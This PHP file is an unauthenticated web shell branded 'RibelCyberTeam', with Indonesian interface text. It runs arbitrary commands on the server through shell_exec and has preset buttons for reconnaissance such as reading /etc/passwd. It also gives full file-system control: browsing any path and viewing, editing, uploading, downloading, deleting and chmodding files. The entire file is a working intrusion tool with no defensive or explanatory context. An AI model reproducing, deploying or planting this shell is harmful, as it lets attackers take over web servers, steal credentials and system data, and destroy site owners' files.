<?php
error_reporting(E_ALL);
set_time_limit(0);

if (!function_exists('scandir')) {
    function scandir($dir) {
        $dh = opendir($dir);
        $files = array();
        while (($file = readdir($dh)) !== false) {
            $files[] = $file;
        }
        closedir($dh);
        sort($files);
        return $files;
    }
}

function h($s) {
    return htmlspecialchars($s);
}

function safe_real($path) {
    $rp = @realpath($path);
    if ($rp === false) return false;
    return $rp;
}

function is_text_file($file) {
    return true;
}

function perms($file) {
    $p = @fileperms($file);
    if ($p === false) return '----';
    return substr(sprintf('%o', $p), -4);
}

function breadcrumb_path($path) {
    $path = str_replace('\\', '/', $path);
    $parts = explode('/', $path);
    $build = '';
    $out = '';

    if (substr($path, 0, 1) == '/') {
        $out .= '/';
    }

    for ($i = 0; $i < count($parts); $i++) {
        if ($parts[$i] == '') continue;

        $build .= '/' . $parts[$i];

        if ($out != '' && substr($out, -1) != '/') {
            $out .= '/';
        }

        $out .= '<a href="?path=' . urlencode($build) . '">' . h($parts[$i]) . '</a>';
    }

    return $out;
}

function perms_string($file) {
    $p = @fileperms($file);
    if ($p === false) return '---------';

    $info = '';

    // file type
    if (($p & 0x4000) == 0x4000) $info .= 'd';
    else $info .= '-';

    // owner
    $info .= (($p & 0x0100) ? 'r' : '-');
    $info .= (($p & 0x0080) ? 'w' : '-');
    $info .= (($p & 0x0040) ? 'x' : '-');

    // group
    $info .= (($p & 0x0020) ? 'r' : '-');
    $info .= (($p & 0x0010) ? 'w' : '-');
    $info .= (($p & 0x0008) ? 'x' : '-');

    // world
    $info .= (($p & 0x0004) ? 'r' : '-');
    $info .= (($p & 0x0002) ? 'w' : '-');
    $info .= (($p & 0x0001) ? 'x' : '-');

    return $info;
}

function fowner_name($file) {
    $uid = @fileowner($file);
    if ($uid === false) return '-';
    if (function_exists('posix_getpwuid')) {
        $x = @posix_getpwuid($uid);
        if (is_array($x) && isset($x['name'])) return $x['name'];
    }
    return $uid;
}

function is_image_file($file) {
    $ext = strtolower(substr(strrchr($file, '.'), 1));
    return in_array($ext, array('jpg','jpeg','png','gif','bmp','webp'));
}

function file_ext($file) {
    $ext = strtolower(substr(strrchr($file, '.'), 1));
    return $ext ? $ext : '-';
}

function fgroup_name($file) {
    $gid = @filegroup($file);
    if ($gid === false) return '-';
    if (function_exists('posix_getgrgid')) {
        $x = @posix_getgrgid($gid);
        if (is_array($x) && isset($x['name'])) return $x['name'];
    }
    return $gid;
}

function format_size($s) {
    if (!is_numeric($s)) return '-';
    if ($s >= 1073741824) return round($s/1073741824, 2).' GB';
    if ($s >= 1048576) return round($s/1048576, 2).' MB';
    if ($s >= 1024) return round($s/1024, 2).' KB';
    return $s.' B';
}

$base = dirname(__FILE__);
$cwd  = isset($_GET['path']) ? $_GET['path'] : $base;
$cwd  = str_replace('\\', '/', $cwd);
$cwd_real = safe_real($cwd);
if ($cwd_real === false) $cwd_real = $base;

$msg = '';

// ========== COMMAND EXECUTION ==========
if (isset($_POST['run_cmd'])) {
    $cmd = $_POST['cmd'];
    if ($cmd != '') {
        $output = @shell_exec($cmd . ' 2>&1');
        if ($output === null || $output === false) {
            $output = 'Command execution failed or no output';
        }
        $msg = '<div style="background:#0a0e14; padding:12px; border-radius:6px; font-family:Consolas,monospace;"><b>Command:</b> ' . h($cmd) . '<br><b>Output:</b><pre style="margin:8px 0 0 0; color:#7ee787; overflow-x:auto;">' . h($output) . '</pre></div>';
    }
}

/* DOWNLOAD */
if (isset($_GET['download']) && $_GET['download'] != '') {
    $file = $_GET['download'];
    if (@is_file($file) && @is_readable($file)) {
        header('Content-Description: File Transfer');
        header('Content-Type: application/octet-stream');
        header('Content-Disposition: attachment; filename="'.basename($file).'"');
        header('Content-Length: '.@filesize($file));
        header('Pragma: public');
        header('Cache-Control: must-revalidate');
        @ob_clean();
        @flush();
        readfile($file);
        exit;
    } else {
        $msg = 'File tidak bisa didownload';
    }
}

/* PREVIEW IMG */
if (isset($_GET['img']) && $_GET['img'] != '') {
    $img = $_GET['img'];

    if (@is_file($img) && @is_readable($img)) {
        $ext = strtolower(substr(strrchr($img, '.'), 1));

        if ($ext == 'jpg' || $ext == 'jpeg') header('Content-Type: image/jpeg');
        elseif ($ext == 'png') header('Content-Type: image/png');
        elseif ($ext == 'gif') header('Content-Type: image/gif');
        elseif ($ext == 'bmp') header('Content-Type: image/bmp');
        elseif ($ext == 'webp') header('Content-Type: image/webp');
        else exit;

        @readfile($img);
        exit;
    }
}

/* ACTIONS */
if (isset($_POST['action'])) {
    $action = $_POST['action'];
    $path   = isset($_POST['path']) ? $_POST['path'] : $cwd_real;
    $path_real = safe_real($path);
    if ($path_real === false) $path_real = $base;

    if ($action == 'save_file') {
        $file    = isset($_POST['file']) ? $_POST['file'] : '';
        $content = isset($_POST['content']) ? $_POST['content'] : '';
        if ($file != '') {
            $fp = @fopen($file, 'w');
            if ($fp) {
                fwrite($fp, $content);
                fclose($fp);
                $msg = 'File berhasil disimpan';
            } else {
                $msg = 'Gagal simpan file';
            }
        }
        $cwd_real = $path_real;
    }

    if ($action == 'delete') {
        $target = isset($_POST['target']) ? $_POST['target'] : '';
        if ($target != '') {
            if (@is_file($target)) {
                if (@unlink($target)) $msg = 'File berhasil dihapus';
                else $msg = 'Gagal hapus file';
            } elseif (@is_dir($target)) {
                if (@rmdir($target)) $msg = 'Folder kosong berhasil dihapus';
                else $msg = 'Gagal hapus folder (harus kosong)';
            }
        }
        $cwd_real = $path_real;
    }

    if ($action == 'rename') {
        $old = isset($_POST['old']) ? $_POST['old'] : '';
        $new = isset($_POST['new']) ? $_POST['new'] : '';
        if ($old != '' && $new != '') {
            $dest = dirname($old) . '/' . basename($new);
            if (@rename($old, $dest)) $msg = 'Berhasil rename';
            else $msg = 'Gagal rename';
        }
        $cwd_real = $path_real;
    }

    if ($action == 'chmod') {
        $target = isset($_POST['target']) ? $_POST['target'] : '';
        $mode   = isset($_POST['mode']) ? $_POST['mode'] : '';
        if ($target != '' && $mode != '') {
            $m = octdec($mode);
            if (@chmod($target, $m)) $msg = 'CHMOD berhasil';
            else $msg = 'CHMOD gagal';
        }
        $cwd_real = $path_real;
    }

    if ($action == 'new_file') {
        $name = isset($_POST['name']) ? $_POST['name'] : '';
        if ($name != '') {
            $target = $path_real . '/' . basename($name);
            if (!file_exists($target)) {
                $fp = @fopen($target, 'w');
                if ($fp) {
                    fclose($fp);
                    $msg = 'File baru berhasil dibuat';
                } else {
                    $msg = 'Gagal buat file';
                }
            } else {
                $msg = 'File sudah ada';
            }
        }
        $cwd_real = $path_real;
    }

    if ($action == 'new_folder') {
        $name = isset($_POST['name']) ? $_POST['name'] : '';
        if ($name != '') {
            $target = $path_real . '/' . basename($name);
            if (!file_exists($target)) {
                if (@mkdir($target, 0777)) $msg = 'Folder baru berhasil dibuat';
                else $msg = 'Gagal buat folder';
            } else {
                $msg = 'Folder sudah ada';
            }
        }
        $cwd_real = $path_real;
    }

    if ($action == 'upload') {
        if (isset($_FILES['upfile']) && isset($_FILES['upfile']['tmp_name'])) {
            $name = basename($_FILES['upfile']['name']);
            $tmp  = $_FILES['upfile']['tmp_name'];
            if ($name != '' && $tmp != '') {
                if (@move_uploaded_file($tmp, $path_real . '/' . $name)) {
                    $msg = 'Upload berhasil';
                } else {
                    $msg = 'Upload gagal';
                }
            } else {
                $msg = 'File upload kosong';
            }
        }
        $cwd_real = $path_real;
    }
}

$view = isset($_GET['view']) ? $_GET['view'] : '';
$edit = isset($_GET['edit']) ? $_GET['edit'] : '';

$server_software = isset($_SERVER['SERVER_SOFTWARE']) ? $_SERVER['SERVER_SOFTWARE'] : '-';
$server_name     = isset($_SERVER['SERVER_NAME']) ? $_SERVER['SERVER_NAME'] : '-';
$uname           = function_exists('php_uname') ? @php_uname() : '-';
$self_user       = function_exists('get_current_user') ? @get_current_user() : '-';
?>
<!DOCTYPE html>
<html>
<head>
<meta http-equiv="Content-Type" content="text/html; charset=utf-8">
<title>root@RibelCyberTeam:~#</title>
<link rel="icon" href="https://backlinkku.id/images/icon/kurakura.png" type="image/png">
<style type="text/css">
body{
    margin:0;padding:0;
    background:#0f1117;
    color:#d6d6d6;
    font-family:Tahoma,Arial,sans-serif;
    font-size:12px;
}
.top{
    background:#151922;
    border-bottom:1px solid #2a3140;
    padding:14px;
}
.title{
    font-size:18px;
    color:#fff;
    font-weight:bold;
}
.muted{color:#8e99ab;}
.path{
    color:#7ee787;
    font-weight:bold;
}
.wrap{padding:14px;}
.box{
    background:#151922;
    border:1px solid #2a3140;
    padding:12px;
    margin-bottom:12px;
    border-radius:8px;
}
.path a{
    color:#7ee787;
    text-decoration:none;
}
.path a:hover{
    text-decoration:underline;
}
.path{
    color:#7ee787;
    font-weight:bold;
}
.quick a, .quick form{
    display:inline;
}
.quick .btn{
    padding:2px 6px;
    font-size:10px;
}
.perm-green{
    color:#7ee787;
    font-weight:bold;
}
.perm-white{
    color:#c9d1d9;
    font-weight:bold;
}
.msg{
    background:#1b2330;
    border:1px solid #3b4a63;
    color:#9ed0ff;
    padding:10px;
    margin-bottom:12px;
    border-radius:8px;
}
input[type=text], textarea, input[type=file]{
    width:100%;
    box-sizing:border-box;
    background:#0f1117;
    color:#e6edf3;
    border:1px solid #30363d;
    padding:7px;
    border-radius:6px;
    font-size:12px;
}
textarea{
    height:450px;
    font-family:Consolas,monospace;
}
table{
    width:100%;
    border-collapse:collapse;
}
th,td{
    border:1px solid #2a3140;
    padding:8px;
    vertical-align:top;
}
th{
    background:#1b2330;
    color:#fff;
}
tr:hover td{
    background:#111723;
}
a{
    color:#79c0ff;
    text-decoration:none;
}
a:hover{
    text-decoration:underline;
}
.btn{
    display:inline-block;
    background:#212936;
    color:#fff;
    border:1px solid #38465c;
    padding:4px 8px;
    font-size:11px;
    border-radius:5px;
    text-decoration:none;
    cursor:pointer;
}
.btn:hover{
    background:#2a3444;
    text-decoration:none;
}
.btn-red{
    background:#3a1f24;
    border-color:#69323b;
}
.btn-green{
    background:#1f3527;
    border-color:#355d42;
}
.btn-yellow{
    background:#3a341f;
    border-color:#6a5f34;
}
.actions a,.actions form{
    display:inline;
}
.small-input{
    width:60px !important;
    display:inline;
}
.name{
    color:#e6edf3;
    font-weight:bold;
}
.dir{
    color:#e6edf3;
    font-weight:bold;
}
.file{
    color:#e6edf3;
}
.grid td{
    width:33%;
}
.hoverbox{
    position:relative;
    display:inline-block;
}
.previewbox{
    display:none;
    position:absolute;
    left:160px;
    top:0;
    z-index:9999;
    background:#0f1117;
    border:1px solid #38465c;
    padding:6px;
    border-radius:8px;
    box-shadow:0 4px 16px rgba(0,0,0,0.45);
    min-width:80px;
}
.previewbox img{
    display:block;
    max-width:220px;
    max-height:220px;
    border-radius:4px;
}
.hoverbox:hover .previewbox{
    display:block;
}
td{
    overflow:visible;
}
.hoverbox{
    position:relative;
    display:inline-block;
}
.previewbox{
    display:none;
    position:absolute;
    left:160px;
    top:0;
    z-index:9999;
    background:#0f1117;
    border:1px solid #38465c;
    padding:8px;
    border-radius:8px;
    box-shadow:0 4px 16px rgba(0,0,0,0.45);
    min-width:180px;
    max-width:260px;
}
.previewbox img{
    display:block;
    max-width:220px;
    max-height:220px;
    border-radius:6px;
    margin-bottom:8px;
}
.hoverbox:hover .previewbox{
    display:block;
}
.miniinfo{
    font-size:11px;
    line-height:1.5;
    color:#c9d1d9;
}
.miniinfo b{
    color:#ffffff;
}
.miniinfo .row{
    margin-bottom:2px;
}
td:first-child{
    white-space:normal;
}
td, table, .box{
    overflow:visible;
}
table, .box{
    overflow:visible;
}
pre{
    white-space:pre-wrap;
    word-wrap:break-word;
    overflow:auto;
}
.cmd-row{
    display:flex;
    gap:10px;
    margin-top:10px;
}
.cmd-row input{
    flex:1;
    font-family:Consolas,monospace;
}
.quick-cmds{
    display:flex;
    flex-wrap:wrap;
    gap:6px;
    margin-top:10px;
}
.quick-cmds button{
    padding:3px 8px;
    font-size:10px;
}
</style>
</head>
<body>

<div class="top">
    <div class="title">root@RibelCyberTeam:~#</div>
    <div class="muted" style="margin-top:6px;">
        Server: <?php echo h($server_name); ?> |
        Software: <?php echo h($server_software); ?> |
        PHP: <?php echo h(phpversion()); ?> |
        User: <?php echo h($self_user); ?><br>
        System: <?php echo h($uname); ?><br>
        Path: <span class="path"><?php echo breadcrumb_path($cwd_real); ?></span> <a href="?"><strong> [ HOME ]</strong></a>
    </div>
</div>

<div class="wrap">

<?php if ($msg != '') { ?>
<div class="msg"><?php echo $msg; ?></div>
<?php } ?>

<!-- COMMAND EXECUTION -->
<div class="box">
    <div class="name">Command Execution</div>
    <form method="post">
        <div class="cmd-row">
            <input type="text" name="cmd" id="cmd" placeholder="Enter command (e.g., whoami, id, ls -la)" autocomplete="off">
            <input type="submit" name="run_cmd" class="btn btn-green" value="Execute">
        </div>
        <div class="quick-cmds">
            <button type="button" class="btn" onclick="setCmd('whoami')">whoami</button>
            <button type="button" class="btn" onclick="setCmd('id')">id</button>
            <button type="button" class="btn" onclick="setCmd('uname -a')">uname -a</button>
            <button type="button" class="btn" onclick="setCmd('pwd')">pwd</button>
            <button type="button" class="btn" onclick="setCmd('ls -la')">ls -la</button>
            <button type="button" class="btn" onclick="setCmd('cat /etc/passwd | head -5')">cat /etc/passwd</button>
            <button type="button" class="btn" onclick="setCmd('ps aux | head -10')">ps aux</button>
        </div>
    </form>
</div>

<?php if ($view != '' && @is_file($view)) { ?>
    <div class="box">
        <div class="name">View File: <?php echo h($view); ?></div>
        <div class="muted" style="margin:8px 0 12px 0;">
            Size: <?php echo h(format_size(@filesize($view))); ?> |
            Owner: <?php echo h(fowner_name($view)); ?> |
            Group: <?php echo h(fgroup_name($view)); ?> |
            Perm: <?php echo h(perms($view)); ?>
        </div>

        <?php if (is_image_file($view)) { ?>
            <div style="margin-top:12px;">
                <img src="?img=<?php echo urlencode($view); ?>" style="max-width:100%; border-radius:8px;" alt="">
            </div>
        <?php } else { ?>
            <pre><?php echo h(@file_get_contents($view)); ?></pre>
        <?php } ?>

        <div style="margin-top:12px;">
            <a class="btn" href="?path=<?php echo urlencode(dirname($view)); ?>">Back</a>
            <a class="btn btn-green" href="?edit=<?php echo urlencode($view); ?>">Edit</a>
            <a class="btn btn-yellow" href="?download=<?php echo urlencode($view); ?>">Download</a>
        </div>
    </div>

<?php } elseif ($edit != '' && @is_file($edit)) { ?>
    <div class="box">
        <div class="name">Edit File: <?php echo h($edit); ?></div>
        <div class="muted" style="margin:8px 0 12px 0;">
            Size: <?php echo h(format_size(@filesize($edit))); ?> |
            Owner: <?php echo h(fowner_name($edit)); ?> |
            Group: <?php echo h(fgroup_name($edit)); ?> |
            Perm: <?php echo h(perms($edit)); ?>
        </div>
        <form method="post">
            <input type="hidden" name="action" value="save_file">
            <input type="hidden" name="path" value="<?php echo h(dirname($edit)); ?>">
            <input type="hidden" name="file" value="<?php echo h($edit); ?>">
            <textarea name="content"><?php echo h(@file_get_contents($edit)); ?></textarea>
            <div style="margin-top:12px;">
                <input type="submit" class="btn btn-green" value="Save File">
                <a class="btn" href="?view=<?php echo urlencode($edit); ?>">View</a>
                <a class="btn" href="?path=<?php echo urlencode(dirname($edit)); ?>">Back</a>
                <a class="btn btn-yellow" href="?download=<?php echo urlencode($edit); ?>">Download</a>
            </div>
        </form>
    </div>
<?php } else { ?>
    <div class="box">
        <table class="grid">
            <tr>
                <td>
                    <div class="name">Buat File Baru</div>
                    <form method="post" style="margin-top:10px;">
                        <input type="hidden" name="action" value="new_file">
                        <input type="hidden" name="path" value="<?php echo h($cwd_real); ?>">
                        <input type="text" name="name">
                        <div style="margin-top:10px;"><input type="submit" class="btn btn-green" value="Create File"></div>
                    </form>
                </td>
                 <td>
                    <div class="name">Buat Folder Baru</div>
                    <form method="post" style="margin-top:10px;">
                        <input type="hidden" name="action" value="new_folder">
                        <input type="hidden" name="path" value="<?php echo h($cwd_real); ?>">
                        <input type="text" name="name">
                        <div style="margin-top:10px;"><input type="submit" class="btn btn-green" value="Create Folder"></div>
                    </form>
                 </td>
                 <td>
                    <div class="name">Upload File</div>
                    <form method="post" enctype="multipart/form-data" style="margin-top:10px;">
                        <input type="hidden" name="action" value="upload">
                        <input type="hidden" name="path" value="<?php echo h($cwd_real); ?>">
                        <input type="file" name="upfile">
                        <div style="margin-top:10px;"><input type="submit" class="btn btn-green" value="Upload"></div>
                    </form>
                 </td>
             </tr>
         </table>
    </div>

    <div class="box">
        <div class="name">Isi Folder</div>
        <div style="margin-top:10px;">
            <table>
                <tr>
                    <th>Nama</th>
                    <th width="70">Tipe</th>
                    <th width="90">Size</th>
                    <th width="140">Modified</th>
                    <th width="70">Perm</th>
                    <th width="90">Owner</th>
                    <th width="90">Group</th>
                    <th width="260">Quick</th>
                    <th width="170">Rename / CHMOD</th>
                </tr>
                <?php
                $items = @scandir($cwd_real);
                $n = 0;
                if (is_array($items)) {

                    $dirs = array();
                    $files = array();

                    foreach ($items as $item) {
                        if ($item == '.' || $item == '..') continue;

                        $full = $cwd_real . '/' . $item;

                        if (@is_dir($full)) {
                            $dirs[] = $item;
                        } else {
                            $files[] = $item;
                        }
                    }

                    natcasesort($dirs);
                    natcasesort($files);

                    $sorted = array_merge($dirs, $files);

                    foreach ($sorted as $item) {
                        $full = $cwd_real . '/' . $item;
                        $is_dir = @is_dir($full);
                        $mtime = @filemtime($full);
                        $modified = $mtime ? date('Y-m-d H:i:s', $mtime) : '-';
                        $perm_text = perms_string($full);
                        $perm_class = @is_writable($full) ? 'perm-green' : 'perm-white';
                        $item_size = $is_dir ? '-' : format_size(@filesize($full));
                        $item_perm = perms($full);
                        $item_owner = fowner_name($full);
                        $item_group = fgroup_name($full);
                        $item_ext = $is_dir ? 'dir' : file_ext($full);
                        $n++;
                ?>
                <tr>
                    <td>
                        <?php
                        if ($is_dir) {
                            $name_class = 'dir';
                        } else {
                            $name_class = 'name';
                        }
                        ?>

                        <?php if ($is_dir) { ?>
                            <span class="dir">[DIR]</span>
                            <a class="<?php echo $name_class; ?>" href="?path=<?php echo urlencode($full); ?>"><?php echo h($item); ?></a>
                        <?php } else { ?>
                            <span class="file">[FILE]</span>

                            <span class="hoverbox">
                                <span class="<?php echo $name_class; ?>"><?php echo h($item); ?></span>

                                <span class="previewbox">
                                    <?php if (is_image_file($full)) { ?>
                                        <img src="?img=<?php echo urlencode($full); ?>" alt="">
                                    <?php } ?>

                                    <div class="miniinfo">
                                        <div class="row"><b>Name:</b> <?php echo h($item); ?></div>
                                        <div class="row"><b>Ext:</b> <?php echo h($item_ext); ?></div>
                                        <div class="row"><b>Size:</b> <?php echo h($item_size); ?></div>
                                        <div class="row"><b>Modified:</b> <?php echo h($modified); ?></div>
                                        <div class="row"><b>Perm:</b> <?php echo h($item_perm); ?></div>
                                        <div class="row"><b>Owner:</b> <?php echo h($item_owner); ?></div>
                                        <div class="row"><b>Group:</b> <?php echo h($item_group); ?></div>
                                        <div class="row"><b>Path:</b> <?php echo h($full); ?></div>
                                    </div>
                                </span>
                            </span>
                        <?php } ?>
                    </td>
                    <td><?php echo $is_dir ? 'DIR' : 'FILE'; ?></td>
                    <td><?php echo $is_dir ? '-' : h(format_size(@filesize($full))); ?></td>
                    <td><?php echo h($modified); ?></td>
                    <td><span class="<?php echo $perm_class; ?>"><?php echo h($perm_text); ?></span></td>
                    <td><?php echo h(fowner_name($full)); ?></td>
                    <td><?php echo h(fgroup_name($full)); ?></td>
  
                    <td class="quick">
                        <?php if (!$is_dir) { ?>
                            <a class="btn" href="?view=<?php echo urlencode($full); ?>">View</a>
                            <a class="btn btn-green" href="?edit=<?php echo urlencode($full); ?>">Edit</a>
                            <a class="btn btn-yellow" href="?download=<?php echo urlencode($full); ?>">Download</a>
                        <?php } else { ?>
                            <a class="btn" href="?path=<?php echo urlencode($full); ?>">Open</a>
                        <?php } ?>

                        <form method="post" style="display:inline;" onsubmit="return confirm('Yakin hapus?');">
                            <input type="hidden" name="action" value="delete">
                            <input type="hidden" name="path" value="<?php echo h($cwd_real); ?>">
                            <input type="hidden" name="target" value="<?php echo h($full); ?>">
                            <input type="submit" class="btn btn-red" value="Delete">
                        </form>
                    </td>

                    <td>
                        <form method="post" style="display:inline;">
                            <input type="hidden" name="action" value="rename">
                            <input type="hidden" name="path" value="<?php echo h($cwd_real); ?>">
                            <input type="hidden" name="old" value="<?php echo h($full); ?>">
                            <input type="text" name="new" value="<?php echo h($item); ?>" style="width:82px;">
                            <input type="submit" class="btn" value="Rename">
                        </form>

                        <form method="post" style="display:inline;">
                            <input type="hidden" name="action" value="chmod">
                            <input type="hidden" name="path" value="<?php echo h($cwd_real); ?>">
                            <input type="hidden" name="target" value="<?php echo h($full); ?>">
                            <input type="text" class="small-input" name="mode" value="<?php echo h(perms($full)); ?>">
                            <input type="submit" class="btn" value="Chmod">
                        </form>
                    </td>
                </tr>
                <?php
                    }
                }
                if ($n == 0) {
                    echo '<tr><td colspan="9">Folder kosong</td></tr>';
                }
                ?>
            </table>
        </div>
    </div>
<?php } ?>

</div>
<script>
function setCmd(cmd) { document.getElementById('cmd').value = cmd; }
</script>
</body>
</html>